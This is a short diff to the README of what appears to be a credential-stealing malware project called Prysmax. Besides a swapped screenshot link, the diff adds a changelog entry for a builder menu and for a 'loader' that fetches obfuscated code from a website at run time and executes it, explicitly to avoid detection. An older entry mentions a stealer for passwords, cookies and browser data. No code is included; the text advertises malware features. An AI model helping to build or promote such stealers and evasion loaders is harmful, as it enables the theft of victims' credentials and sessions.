@@ -35,7 +35,7 @@
 ### 📸 〢 Screenshots
 
 
-<img title="" src="https://i.imgur.com/MhB6LGz.png" alt="" width="539">
+<img title="" src="https://i.imgur.com/Hb1BsR0.png" alt="" width="539">
 
 <img title="" src="https://i.imgur.com/2BesbRq.png" alt="" width="539">
 
@@ -61,6 +61,11 @@ If it does not work, install microsoft visual c++ redistributable and python 3.1
 ## <a id="changelog"></a>🌟 〢 ChangeLog
 
 ```diff
+v1.6 ⋮ 2025-04-19
++ The design of the construction menu has been improved.
++ Fixed and improved compilation issues
++ A new Prysmax ‘loader’ has been added, which uploads the obfuscated code to a website and when running the executable gets the code and executes it dynamically to avoid detections.
+
 
 v1.5 ⋮ 2024-10-7
 + Password, cookies, browsers stealer fixed.
